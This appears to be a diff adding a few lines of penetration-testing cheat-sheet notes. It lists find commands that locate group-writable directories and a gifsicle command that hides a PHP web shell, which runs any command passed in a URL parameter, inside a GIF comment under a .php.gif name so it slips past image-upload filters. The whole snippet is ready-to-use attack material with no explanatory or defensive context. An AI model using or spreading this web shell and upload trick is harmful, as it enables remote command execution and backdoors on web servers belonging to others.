@@ -1,0 +1,7 @@
+# find writable directories by Group
+find /dir/ -perm /g=w 
+find /dir/ -perm /g=w -exec ls -lLd {} +
+
+# embed php code in a gif
+gifsicle < backdoor.gif --comment "<?php system($_GET["cmd"]); ?>" > output.php.gif
+
